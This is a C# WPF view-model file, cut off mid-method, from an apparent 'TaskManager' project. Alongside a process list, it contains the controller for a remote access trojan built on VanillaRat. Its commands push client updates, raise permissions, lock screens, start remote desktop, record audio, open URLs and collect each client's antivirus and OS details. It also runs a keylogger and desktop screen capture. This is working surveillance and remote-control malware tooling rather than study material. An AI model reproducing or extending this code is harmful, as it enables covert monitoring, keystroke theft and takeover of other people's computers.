using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using TaskManager.Command;
using OpenFileDialog = System.Windows.Forms.OpenFileDialog;
using Application = System.Windows.Forms.Application;
using WpfApp15.ViewModel;
using MessageBox = System.Windows.MessageBox;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Cursor = System.Windows.Input.Cursor;
using System.Windows.Shapes;
using Path = System.IO.Path;
using System.Diagnostics;
using System.Windows.Input;
using LiveCharts;
using System.Windows.Threading;
using System.Threading;
using LiveCharts.Defaults;
using LiveCharts.Wpf;
using System.Linq;
using System.Collections.ObjectModel;
using System.Windows.Controls;
using System.Management;
using CpuGpuGraph;
using System.Reflection;
using Telepathy;
using VanillaRat.Classes;
using static VanillaRat.Classes.Server;
using Message = Telepathy.Message;
using WpfApp15.Model.Program;
using Client = WpfApp15.Model.Program.Client;
using System.Text;
using System.Drawing;
using WpfApp15.Scripts.Other;
using WpfApp15.ViewModel.UserControl;
using Image = System.Drawing.Image;
using WpfApp15.Scripts;
using Google.Apis.Oauth2.v2;
using Google.Apis.Services;
using Google.Apis.Oauth2.v2.Data;
using Google.Apis.Drive.v3.Data;
using System.Windows.Documents;
using System.Collections.Generic;
using WpfApp15.Model;
using System.ComponentModel;
using Hangfire.Annotations;
using System.Runtime.CompilerServices;
using VanillaStub.Helpers.Services.StreamLibrary.UnsafeCodecs;
using VanillaStub.Helpers.Services.StreamLibrary;

namespace TaskManager
{
    public class ViewModel : MainViewModel
    {
        #region Proc
        void LoadPriorites()
        {
            var el = Enum.GetValues(typeof(ProcessPriorityClass)).Cast<ProcessPriorityClass>();
            foreach (var el2 in el)
            {
                Priorites.Add(el2);
            }
            SelectedPriorites = Priorites[0];
        }
        private ProcessListItem _selectedProcess;

        internal void ChangePriority()
        {
            SelectedProcess.ChangePriority(SelectedPriorites);
        }

        public ProcessListItem SelectedProcess
        {
            get => _selectedProcess;
            set
            {
                _selectedProcess = value;
                OnPropertyChanged("SelectedProcess");
            }
        }
        private ProcessPriorityClass _selectedPriorites;
        public ProcessPriorityClass SelectedPriorites
        {
            get => _selectedPriorites;
            set
            {
                _selectedPriorites = value;
                OnPropertyChanged(nameof(SelectedPriorites));
            }
        }

        public ObservableCollection<ProcessListItem> Processes { get; } = new ObservableCollection<ProcessListItem>();
        public ObservableCollection<ProcessPriorityClass> Priorites { get; set; } = new ObservableCollection<ProcessPriorityClass>();



        //public void ChangePriority(ProcessPriorityClass priority)
        //{
        //    SelectedProcess.PriorityClass = priority;
        //}

        public void KillSelectedProcess()
        {
            try
            {
                SelectedProcess.Kill();
            }
            catch (Exception er)
            {
                System.Windows.MessageBox.Show(er.Message, "Eror", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private RelayCommand killCommand;
        public RelayCommand KillCommand
        {
            get
            {
                return killCommand ??
                    (killCommand = new RelayCommand(obj =>
                    {

                        KillSelectedProcess();
                    }));
            }
        }
        private RelayCommand changeCommand;
        public RelayCommand ChangeCommand
        {
            get
            {
                return changeCommand ??
                    (changeCommand = new RelayCommand(obj =>
                    {
                        ChangePriority();
                    }));
            }
        }

        private RelayCommand refreshCommand;
        public RelayCommand RefreshCommand
        {
            get
            {
                return refreshCommand ??
                    (refreshCommand = new RelayCommand(obj =>
                    {
                        UpdateProcessesFilter();
                    }));
            }
        }

        private RelayCommand startCommand;
        public RelayCommand StartCommand
        {
            get
            {
                return startCommand ??
                    (startCommand = new RelayCommand(obj =>
                    {
                        StartProcess();
                    }));
            }
        }
        private RelayCommand filterCommand;
        public RelayCommand FilterCommand
        {
            get
            {
                return filterCommand ??
                    (filterCommand = new RelayCommand(obj =>
                    {
                        UpdateProcessesFilter();
                    }));
            }
        }
        private RelayCommand checkedCommand;
        public RelayCommand CheckedCommand
        {
            get
            {
                return checkedCommand ??
                    (checkedCommand = new RelayCommand(obj =>
                    {
                        if (SelectedProcess.KeepAlive == false)
                        {
                            SelectedProcess.KeepAlive = true;
                        }
                        else
                        {
                            SelectedProcess.KeepAlive = false;
                        }
                    }));
            }
        }
        private string searchString;
        public string SearchString
        {
            get { return searchString; }
            set
            {
                if (searchString != value)
                {
                    searchString = value;
                    OnPropertyChanged(nameof(SearchString));
                }
            }
        }
        private void UpdateProcessesFilter(object sender = null, EventArgs e = null)
        {
            var currentIds = Processes.Select(p => p.Id).ToList();

            foreach (var p in Process.GetProcesses())
            {
                if (searchString.Replace(" ", "") == "" || searchString.ToLower() == "all" )
                {
                    if (!currentIds.Remove(p.Id))
                    {
                        Processes.Add(new ProcessListItem(p));
                    }
                }
                else if (p.ProcessName.Contains(searchString))
                {
                    if (!currentIds.Remove(p.Id))
                    {
                        Processes.Add(new ProcessListItem(p));
                    }
                }
            }

            foreach (var id in currentIds)
            {
                var process = Processes.First(p => p.Id == id);
                if (process.KeepAlive)
                {
                    Process.Start(process.ProcessName, process.Arguments);
                }
                Processes.Remove(process);
            }

        }

        async void ShowStaticsAsync(object sender = null, EventArgs e = null)
        {
            //UIHelper.FindChild<TextBlock>(System.Windows.Application.Current.MainWindow, "proctxt").Text = await Task.Run(() =>
            //{
            //    return getCurrentProcessQty();
            //});
            //UIHelper.FindChild<TextBlock>(System.Windows.Application.Current.MainWindow, "cptxt").Text = await Task.Run(() =>
            //{
            //    return getCurrentCpuUsage();
            //});
            //UIHelper.FindChild<TextBlock>(System.Windows.Application.Current.MainWindow, "memorytxt").Text = await Task.Run(() =>
            //{
            //    return getAvailableRAM();
            //});
        }

        public static string getAvailableRAM()
        {

            var wmiObject = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            int percent = 0;
            var memoryValues = wmiObject.Get().Cast<ManagementObject>().Select(mo => new {
                FreePhysicalMemory = Double.Parse(mo["FreePhysicalMemory"].ToString()),
                TotalVisibleMemorySize = Double.Parse(mo["TotalVisibleMemorySize"].ToString())
            }).FirstOrDefault();

            if (memoryValues != null)
            {
                percent = Convert.ToInt32(((memoryValues.TotalVisibleMemorySize - memoryValues.FreePhysicalMemory) / memoryValues.TotalVisibleMemorySize) * 100);
            }

            return percent.ToString() + "%";

        }
        private void StartProcess()
        {
            string _file;
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                _file = openFileDialog1.FileName;
                try
                {
                    Process.Start(_file);
                }
                catch (IOException)
                {
                }
            }
        }
        #endregion
        #region Constructor
        public ViewModel(Window window):base(window)
        {
            Header = "   ";
            MessageSound = "  ";
            Message = "   ";
            searchString = "";
            IsOnServer = false;
            StartCountEnterKey();
            GetRecievedData();
            Cursor cursor =  new Cursor($"{Path.GetDirectoryName(Path.GetDirectoryName(Directory.GetCurrentDirectory()))}\\ViewModel\\Images\\Cursors\\Cursor.ani"); 
            window.Cursor = cursor;
            Task.Factory.StartNew(() =>
            {
                Action action = delegate
                {
                    UpdateProcessesFilter();
                };
                while (true)
                {
                    Task.Delay(10);
                    System.Windows.Application.Current.Dispatcher.Invoke(DispatcherPriority.Background, action);
                }
            });
            try
            {
                var request = ModelLogin.service.About.Get();
                request.Fields = "user";
                var user = request.Execute().User;
                Email = user.EmailAddress;

            }
            catch(Exception er)
            {
                MessageBox.Show(er.Message);
            }
            //MessageBox.Show(el);
            LoadPriorites();
            MessageBoxIcons.AddAsync(MessageBoxIcon.Error, MessageBoxIcon.Information, MessageBoxIcon.Warning, MessageBoxIcon.Question);
            MessageBoxButtons.AddAsync(MessageBoxButton.OK, MessageBoxButton.OKCancel, MessageBoxButton.YesNo, MessageBoxButton.YesNoCancel);
        }
        #endregion
        #region Commands
        private RelayCommand changeTabControl;
        public RelayCommand ChangeTabControlStat
        {
            get
            {
                return changeTabControl ??
                    (changeTabControl = new RelayCommand(obj =>
                    {
                        try
                        {
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            UIHelper.FindChild<System.Windows.Controls.TabControl>(el, "tabControl1").SelectedIndex = 1;
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }

                    }));
            }
        }
        private RelayCommand changeTabControlLogger;
        public RelayCommand ChangeTabControlLogger
        {
            get
            {
                return changeTabControlLogger ??
                    (changeTabControlLogger = new RelayCommand(obj =>
                    {
                        try
                        {
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            UIHelper.FindChild<System.Windows.Controls.TabControl>(el, "tabControl1").SelectedIndex = 2;
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }

                    }));
            }
        }
        private RelayCommand changeTabControlSettings;
        public RelayCommand ChangeTabControlSettings
        {
            get
            {
                return changeTabControlSettings ??
                    (changeTabControlSettings = new RelayCommand(obj =>
                    {
                        try
                        {
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            UIHelper.FindChild<System.Windows.Controls.TabControl>(el, "tabControl1").SelectedIndex = 4;
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }

                    }));
            }
        }

        private RelayCommand changeTabControlOtchet;
        public RelayCommand ChangeTabControlOtchet
        {
            get
            {
                return changeTabControlOtchet ??
                    (changeTabControlOtchet = new RelayCommand(obj =>
                    {
                        try
                        {
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            UIHelper.FindChild<System.Windows.Controls.TabControl>(el, "tabControl1").SelectedIndex = 3;
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }

                    }));
            }
        }

        private RelayCommand openInst;
        public RelayCommand OpenInst
        {
            get
            {
                return openInst ??
                    (openInst = new RelayCommand(obj =>
                    {
                        StartProcess("https://www.instagram.com/pr_m.a.x/");
                    }));
            }
        }
        private RelayCommand openGit;
        public RelayCommand OpenGit
        {
            get
            {
                return openGit ??
                    (openGit = new RelayCommand(obj =>
                    {
                        StartProcess("https://github.com/MaxymGorn");
                    }));
            }
        }
        private RelayCommand sendMessage;
        public RelayCommand SendMessage
        {
            get
            {
                return sendMessage ??
                    (sendMessage = new RelayCommand(obj =>
                    {
                        MainServer.Send(SelectedData.Id,
    Encoding.ASCII.GetBytes("MsgBox<{<" + Message + ">[" + Header + "]{" + SelectedButton + "}" + "/" + SelectedIcon + @"\}>"));
                    }));
            }
        }
        private RelayCommand sendMessageTest;
        public RelayCommand SendMessageTest
        {
            get
            {
                return sendMessageTest ??
                    (sendMessageTest = new RelayCommand(obj =>
                    {
                        MessageBox.Show(Message, Header, SelectedButton, (MessageBoxImage)SelectedIcon);
                    }));
            }
        }
        private RelayCommand openGmail;
        public RelayCommand OpenGmail
        {
            get
            {
                return openGmail ??
                    (openGmail = new RelayCommand(obj =>
                    {
                        StartProcess("https://mail.google.com/mail/?view=cm&fs=1&tf=1&to=maximus56132@gmail.com");
                    }));
            }
        }
        private RelayCommand killClient;
        public RelayCommand KillClient
        {
            get
            {
                return killClient ??
                    (killClient = new RelayCommand(obj =>
                    {
                        MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("KillClient"));
                    }));
            }
        }
        private RelayCommand toggleScreenlock;
        public RelayCommand Screenlock
        {
            get
            {
                return toggleScreenlock ??
                    (toggleScreenlock = new RelayCommand(obj =>
                    {
                        MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("ToggleScreenlock"));
                    }));
            }
        }
        private RelayCommand disconnectClient;
        public RelayCommand DisconnectClient
        {
            get
            {
                return disconnectClient ??
                    (disconnectClient = new RelayCommand(obj =>
                    {
                        MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("DisconnectClient"));
                    }));
            }
        }
        private RelayCommand raisePerms;
        public RelayCommand RaisePerms
        {
            get
            {
                return raisePerms ??
                    (raisePerms = new RelayCommand(obj =>
                    {
                        MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("RaisePerms"));
                    }));
            }
        }
        private RelayCommand updateClient;
        public RelayCommand UpdateClient
        {
            get
            {
                return updateClient ??
                    (updateClient = new RelayCommand(obj =>
                    {
                        try
                        {
                            if (selectedData==null)
                            {
                                throw new Exception("Please select a client!");
                            }
                            OpenFileDialog OFD = new OpenFileDialog();
                            OFD.Multiselect = false;
                            OFD.InitialDirectory = Environment.CurrentDirectory + @"\Clients\";
                            if (OFD.ShowDialog() == DialogResult.OK)
                            {
                                if (!TempDataHelper.CanUpload)
                                {
                                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                                }
                                else
                                {
                                    TempDataHelper.CanUpload = false;
                                    string FileString = OFD.FileName;
                                    byte[] FileBytes;
                                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                                    {
                                        FileBytes = new byte[FS.Length];
                                        FS.Read(FileBytes, 0, FileBytes.Length);
                                    }
                                    AutoClosingMessageBox.Show("Starting client update.", "Starting Upload", 1000);
                                    MainServer.Send(selectedData.Id, Encoding.ASCII.GetBytes("StartFileReceive{[UPDATE]" + Path.GetFileName(OFD.FileName) + "}"));
                                    Thread.Sleep(80);
                                    MainServer.Send(selectedData.Id, FileBytes);
                                    TempDataHelper.CanUpload = true;
                                }
                            }
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show(er.Message, "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                        }                        
                    }));
            }
        }
        private RelayCommand startlogginng;
        public RelayCommand Startlogginng
        {
            get
            {
                return startlogginng ??
                    (startlogginng = new RelayCommand(obj =>
                    {
                        if (Writefile == false)
                        {
                            Writefile = true;
                            UpdateEventLog("Start KeyLogger: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                            Task.Run(() => ScreenShot.sendNotificationKeyLoggerDekstop("Start key log to file!"));
                        }
                        else
                        {
                            Writefile = false;
                            UpdateEventLog("Stop KeyLogger: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                        }
                        try
                        {
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            object text = UIHelper.FindChild<System.Windows.Controls.TextBox>(el, "outputfile").Text;
                            if ((text as string).Length == 0)
                            {
                                throw new IOException("Please choose a file correct!");
                            }

                            Task.Run(() => LoggerKeys.StartLogging(text as string, this));
                            Task.Delay(1);

                        }
                        catch (IOException er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show("Eror!", er.Message, MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                        }

                    }));
            }
        }

        private RelayCommand sendMessageSound;
        public RelayCommand SendMessageSound
        {
            get
            {
                return sendMessageSound ??
                    (sendMessageSound = new RelayCommand(obj =>
                    {
                        try
                        {
                            if (string.IsNullOrWhiteSpace(MessageSound.Trim()))
                            {
                                throw new Exception("You must enter text before TTS is heard or sent.");
                            }
                            MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("[<TTS>]" + MessageSound));
                        }
                        catch(Exception er)
                        {
                            MessageBox.Show(er.Message, "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                        }
                    }));
            }
        }
        private RelayCommand openWindowChat;
        public RelayCommand OpenWindowChat
        {
            get
            {
                return openWindowChat ??
                    (openWindowChat = new RelayCommand(obj =>
                    {
                        try
                        {
                            if (SelectedData==null)
                            {
                                throw new Exception("You must selected user!");
                            }
                            MainServer.Send(SelectedData.Id, Encoding.ASCII.GetBytes("OpenChat"));
                        }
                        catch (Exception er)
                        {
                            MessageBox.Show(er.Message, "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                        }
                    }));
            }
        }
        private RelayCommand changeDictionary;
        public RelayCommand ChangeDictionaries
        {
            get
            {
                return changeDictionary ??
                    (changeDictionary = new RelayCommand(obj =>
                    {
                        ChangeDictionary();
                    }));
            }
        }
        private RelayCommand changeDirectory;
        public RelayCommand ChangeDirectory
        {
            get
            {
                return changeDirectory ??
                    (changeDirectory = new RelayCommand(obj =>
                    {
                        string _file;
                        OpenFileDialog openFileDialog1 = new OpenFileDialog() { InitialDirectory = $" ../../{Application.StartupPath }" };
                        if (openFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            _file = openFileDialog1.FileName;
                            try
                            {
                                var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                                UIHelper.FindChild<System.Windows.Controls.TextBox>(el, "outputfile").Text = openFileDialog1.FileName;
                            }
                            catch (IOException)
                            {
                            }
                        }
                    }));
            }
        }

        private RelayCommand changeDirectoryDedstopScreen;
        public RelayCommand ChangeDirectoryDekstopScreen
        {
            get
            {
                return changeDirectoryDedstopScreen ??
                    (changeDirectoryDedstopScreen = new RelayCommand(obj =>
                    {
                        using (var fldrDlg = new FolderBrowserDialog() { SelectedPath = Application.StartupPath + @"\Autosave" })
                        {
                            string _file;
                            if (fldrDlg.ShowDialog() == DialogResult.OK)
                            {
                                _file = fldrDlg.SelectedPath;
                                try
                                {
                                    var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                                    UIHelper.FindChild<System.Windows.Controls.TextBox>(el, "outputfilescreen").Text = _file;
                                }
                                catch (IOException)
                                {
                                }
                            }
                        }
                    }));
            }

        }

        private RelayCommand changeDirectoryWebScreen;
        public RelayCommand ChangeDirectoryWebScreen
        {
            get
            {
                return changeDirectoryWebScreen ??
                    (changeDirectoryWebScreen = new RelayCommand(obj =>
                    {
                        using (var fldrDlg = new FolderBrowserDialog() { SelectedPath = Application.StartupPath })
                        {
                            string _file;
                            if (fldrDlg.ShowDialog() == DialogResult.OK)
                            {
                                _file = fldrDlg.SelectedPath;
                                try
                                {
                                    var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                                    UIHelper.FindChild<System.Windows.Controls.TextBox>(el, "outputfilewebcam").Text = _file;
                                }
                                catch (IOException)
                                {
                                }
                            }
                        }

                    }));
            }
        }
        private RelayCommand startlogginngsCREEN;
        public RelayCommand StartlogginngsCREEN
        {
            get
            {
                return startlogginngsCREEN ??
                    (startlogginngsCREEN = new RelayCommand(obj =>
                    {
                        if (Writedirectoryscreendekstop == false)
                        {
                            Writedirectoryscreendekstop = true;
                            Task t = Task.Run(() => ScreenShot.sendNotificationKeyLoggerDekstop("Start Logger Dekstop Screen to directory...!"));
                            Task.WaitAll(t);
                            UpdateEventLog("Start Logger Dekstop Screen: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                            var el = System.Windows.Application.Current.Windows.OfType<Window>().ToList().Where(e => e.Title == "").FirstOrDefault();
                            captureScreen(false, UIHelper.FindChild<System.Windows.Controls.TextBox>(el, "outputfilescreen").Text, "files", "1", ImageFormat.Png);
                        }
                        else
                        {
                            Writedirectoryscreendekstop = false;
                            UpdateEventLog("Stop Logger Dekstop Screen: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                        }
                    }));
            }
        }

        private RelayCommand startServer;
        public RelayCommand StartServer
        {
            get
            {
                return startServer ??
                    (startServer = new RelayCommand(obj =>
                    {
                        if (IsOnServer == false)
                        {
                            IsOnServer = true;
                            int Port = Settings.GetPort();
                            MainServer.Start(Port);
                            Task t = Task.Run(() => ScreenShot.sendNotification(10, Assembly.GetExecutingAssembly().GetName().Name, "Server is started!", ToolTipIcon.Info));
                            Task.WaitAll(t);
                            UpdateEventLog("Start Server: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                        }
                        else
                        {
                            IsOnServer = false;
                            MainServer.Stop();
                            UpdateEventLog("Stop Server: ", $"Time: {DateTime.Now.ToString("dddd, dd MMMM yyyy HH:mm:ss")}");
                        }
                    }));
            }
        }
        private RelayCommand openRemoteDekstop;
        public RelayCommand OpenRemoteDekstop
        {
            get
            {
                return openRemoteDekstop ??
                    (openRemoteDekstop = new RelayCommand(async obj =>
                    {
                        try
                        {
                            SendCommandServer("StartRD", RDActive);
                            var RemoteDekstop = Activator.CreateInstance<RemoteDekstop>();
                            RemoteDekstop.Show();
                            RemoteDekstop.Activate();
                        }
                        catch { }
                    }));
            }
        }
        private RelayCommand openInfoComp;
        public RelayCommand OpenInfoComp
        {
            get
            {
                return openInfoComp ??
                    (openInfoComp = new RelayCommand(async obj =>
                    {
                        SendCommandServer("GetComputerInfo", InfoComp);
                    }));
            }
        }
        private RelayCommand openProcessForm;
        public RelayCommand OpenProcessForm
        {
            get
            {
                return openProcessForm ??
                    (openProcessForm = new RelayCommand(async obj =>
                    {
                        try
                        {
                            SendCommandServer("GetProcesses", ProcessAppActive);
                        }
                        catch { }
                    }));
            }
        }

        private RelayCommand openBrowser;
        public RelayCommand OpenBrowser
        {
            get
            {
                return openBrowser ??
                    (openBrowser = new RelayCommand(async obj =>
                    {
                        try
                        {
                            if (Clients.Count <= 0)
                            {
                                MessageBox.Show("Please select a client!", "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                                return;
                            }
                            if (BrowserActive)
                            {
                                MessageBox.Show("Open Url is already active!", "Error", MessageBoxButton.OK,
                                    (MessageBoxImage)MessageBoxIcon.Error);
                                return;
                            }
                            BrowserActive = true;
                            var RemoteDekstop = Activator.CreateInstance<OpenUrl>();
                            RemoteDekstop.Show();
                            RemoteDekstop.Activate();
                        }
                        catch { }
                    }));
            }
        }
        void SendCommandServer(string NameCommand, bool Value)
        {
            try
            {
                Task.Run(()=> {
                    if (Clients.Count <= 0 || SelectedData == null)
                    {
                        MessageBox.Show("Please select a client!", "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                    }
                    else if (Value)
                    {
                        MessageBox.Show("Is already active!", "Error", MessageBoxButton.OK,
                            (MessageBoxImage)MessageBoxIcon.Error);
                        return;
                    }
                    else
                    {
                        MainServer.Send(selectedData.Id, Encoding.ASCII.GetBytes(NameCommand));
                    }
                });
            }
            catch { }
        }
        private RelayCommand openRecorder;
        public RelayCommand OpenRecorder
        {
            get
            {
                return openRecorder ??
                    (openRecorder = new RelayCommand(async obj =>
                    {
                        try
                        {
                            if (Clients.Count <= 0)
                            {
                                MessageBox.Show("Please select a client!", "Error", MessageBoxButton.OK, (MessageBoxImage)MessageBoxIcon.Error);
                                return;
                            }
                            if (AudioRecorderActive)
                            {
                                MessageBox.Show("Audio recorder is already active!", "Error", MessageBoxButton.OK,
                                    (MessageBoxImage)MessageBoxIcon.Error);
                                return;
                            }
                            AudioRecorderActive = true;
                            var RemoteDekstop = Activator.CreateInstance<AudioRecorder>();
                            RemoteDekstop.Show();
                            RemoteDekstop.Activate();
                        }
                        catch { }
                    }));
            }
        }
        #endregion
        #region Properties



        public static bool writefile;
        public bool Writefile
        {
            get
            {
                return writefile;
            }
            set
            {
                writefile = value;
                OnPropertyChanged(nameof(Writefile));

            }
        }

        public static bool writedirectoryscreendekstop;
        public bool Writedirectoryscreendekstop
        {
            get
            {
                return writedirectoryscreendekstop;
            }
            set
            {
                writedirectoryscreendekstop = value;
                OnPropertyChanged(nameof(Writedirectoryscreendekstop));

            }
        }

        public static bool isOnServer;
        public bool IsOnServer
        {
            get
            {
                return isOnServer;
            }
            set
            {
                isOnServer = value;
                OnPropertyChanged(nameof(IsOnServer));

            }
        }
        public CpuModel CpuModel { get; } = new CpuModel();
        public SeriesCollection LastHourSeries { get; set; }
        private double _lastLecture;
        public static double _trend;
        public double LastLecture
        {
            get { return _lastLecture; }
            set
            {
                _lastLecture = value;
                OnPropertyChanged("LastLecture");
            }
        }

        public static string pingValue { get; set; } = "n/a";
        public string PingValue
        {
            get { return pingValue; }
            set
            {
                pingValue = value;
                OnPropertyChanged(nameof(PingValue));
            }
        }

        public ObservableCollection<WpfApp15.Model.Program.Client> Clients { get; } = new ObservableCollection<WpfApp15.Model.Program.Client>();
        public ObservableCollection<MessageBoxIcon> MessageBoxIcons  { get; } = new ObservableCollection<MessageBoxIcon>();
        public ObservableCollection<MessageBoxButton> MessageBoxButtons { get; } = new ObservableCollection<MessageBoxButton>();
        public WpfApp15.Model.Program.Client SelectedData
        {
            get => selectedData;
            set
            {
                selectedData = value;
                OnPropertyChanged(nameof(SelectedData));
            }
        }
        public MessageBoxButton SelectedButton
        {
            get => this.selectedButton;
            set
            {
                this.selectedButton = value;
                OnPropertyChanged(nameof(SelectedButton));
            }
        }
        public MessageBoxIcon SelectedIcon
        {
            get => this.selectedIcon;
            set
            {
                this.selectedIcon = value;
                OnPropertyChanged(nameof(SelectedIcon));
            }
        }
        private string header;
        public string Header
        {
            get { return this.header; }
            set
            {
                if (!string.Equals(this.header, value))
                {
                    this.header = value;
                    OnPropertyChanged(nameof(Header));
                }
            }
        }
        private string message;
        public string Message
        {
            get { return this.message; }
            set
            {
                if (!string.Equals(this.message, value))
                {
                    this.message = value;
                    OnPropertyChanged(nameof(Message));
                }
            }
        }
        private string messageSound;
        public string MessageSound
        {
            get { return this.messageSound; }
            set
            {
                if (!string.Equals(this.messageSound, value))
                {
                    this.messageSound = value;
                    OnPropertyChanged(nameof(MessageSound));
                }
            }
        }

        private static string email;
        public static string Email
        {
            get { return email; }
            set
            {
                if (!string.Equals(email, value))
                {
                    email = value;
                    OnStaticChanged(nameof(Email));
                }
            }
        }
        public static bool RDActive { get;  set; }
        public static bool BrowserActive { get; set; }
        public static bool AudioRecorderActive { get; set; }
        public static bool ChatActive { get; set; }
        public static bool InfoComp { get; set; }
        public static bool ProcessAppActive { get; set; }

        #endregion
        #region Private Member
        public static WpfApp15.Model.Program.Client selectedData { get; set; }
        private MessageBoxButton selectedButton;
        private MessageBoxIcon selectedIcon;
        public static Image ImageToDisplay;
        public static byte[] Audio;
        private Settings.Values Settings;
        #endregion
        #region Function
        private async void StartProcess(string text)
        {
            await Task.Run(() => Process.Start(text));
        }
        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch { }

            return "";
        }
        public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
        {
            //string[] FilesArrayRaw = Files.Split(new[] { "][" }, StringSplitOptions.None);
            //string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
            //foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
            //    if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
            //    {
            //        FE.lbFiles.Items.Clear();
            //        foreach (string S in FilesArray)
            //        {
            //            string Filename = GetSubstringByString("{", "}", S);
            //            string Extension = GetSubstringByString("<", ">", S);
            //            string DateCreated = GetSubstringByString("[", "]", S);
            //            string[] ToAdd = { Filename, Extension, DateCreated };
            //            var ListItem = new ListViewItem(ToAdd);
            //            FE.lbFiles.Items.Add(ListItem);
            //        }

            //        return;
            //    }

            //FE = new FileExplorer();
            //FE.Show();
            //FE.ConnectionID = ConnectionId;
            //FE.Text = "File Explorer - " + FE.ConnectionID;
            //if (FE.ConnectionID == ConnectionId)
            //{
            //    FE.lbFiles.Items.Clear();
            //    foreach (string S in FilesArray)
            //    {
            //        string Filename = GetSubstringByString("{", "}", S);
            //        string Extension = GetSubstringByString("<", ">", S);
            //        string DateCreated = GetSubstringByString("[", "]", S);
            //        string[] ToAdd = { Filename, Extension, DateCreated };
            //        var ListItem = new ListViewItem(ToAdd);
            //        FE.lbFiles.Items.Add(ListItem);
            //    }
            //}
        }
        private void AddClientTag(int ConnectionId, string Tag)
        {
            for (int n = Clients.Count - 1; n >= 0; --n)
            {
                if (Clients[n].Id.ToString().Contains(ConnectionId.ToString()))
                    Clients[n].ClientTag = Tag;
            }
        }
        //Gets anti-virus from client then updates list item
        private void AddAntiVirus(int ConnectionId, string AntiVirus)
        {
            for (int n = Clients.Count - 1; n >= 0; --n)
            {
                if (Clients[n].Id.ToString().Contains(ConnectionId.ToString()))
                    Clients[n].AntiVirus = AntiVirus;
            }
        }

        //Gets operating system from client then updates list item
        private void AddOperatingSystem(int ConnectionId, string OperatingSystem)
        {
            for (int n = Clients.Count - 1; n >= 0; --n)
            {
                if (Clients[n].Id.ToString().Contains(ConnectionId.ToString()))
                    Clients[n].OperatingSystem = OperatingSystem;
            }
        }
        void ChangeDictionary()
        {
            if (_blue)
                System.Windows.Application.Current.Resources.MergedDictionaries[0] = new ResourceDictionary() { Source = new Uri("Blue.xaml", UriKind.Relative) };
            else
                System.Windows.Application.Current.Resources.MergedDictionaries[0] = new ResourceDictionary() { Source = new Uri("Black.xaml", UriKind.Relative) };
            _blue = !_blue;
        }

        private void captureScreen(bool cursor, string folder, string pattern, string number, ImageFormat format)
        {
            var screenshot = new ScreenShot(cursor, folder, pattern, number, format, true, this);
             screenshot.CaptureAndSave();
        }
        private void SetLecture()
        {
            var target = ((ChartValues<ObservableValue>)LastHourSeries[0].Values).Last().Value;
            var step = (target - _lastLecture) / 4;
            Task.Factory.StartNew(() =>
            {
                for (var i = 0; i < 4; i++)
                {
                    Thread.Sleep(100);
                    LastLecture += step;
                }
                LastLecture = target;
            });
        }
        private void StartCountEnterKey()
        {
            LastHourSeries = new SeriesCollection
            {
                new LineSeries
                {
                    AreaLimit = -10,
                    Values = new ChartValues<ObservableValue>
                    {
